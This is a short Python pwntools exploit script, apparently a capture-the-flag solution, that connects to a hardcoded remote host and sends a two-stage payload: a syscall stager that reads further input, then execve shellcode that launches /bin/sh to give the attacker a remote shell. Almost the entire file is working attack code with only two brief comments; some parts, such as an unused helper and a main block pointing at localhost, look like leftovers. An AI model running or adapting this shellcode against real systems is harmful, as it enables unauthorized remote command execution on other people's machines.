# coding=utf-8
# !/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "13.112.180.65"
PORT = 8361

# First syscall loads rip into rcx
# Second syscall overwrites the shellcode with the new input
STAGER = """    
    start:
    syscall
    push rcx
    pop rsi
    mov dl, 100
    jmp start
    """

# Simple execve shellcode
SHELLCODE = """
    mov rax, 59
    mov rdi, rcx
    add rdi, 0x16
    xor rsi, rsi
    xor rdx, rdx
    syscall
    """


def exploit(r):
    context.arch = "amd64"

    print (disasm(asm(STAGER)))
    r.send(asm(STAGER))
    payload = asm(SHELLCODE) + "/bin/sh\x00"

    r.sendline(payload)

def method14(ip,port):
    r=remote(ip,port)
    exploit(r)

if __name__ == "__main__":
    r = remote("127.0.0.1", 80)
    exploit(r)
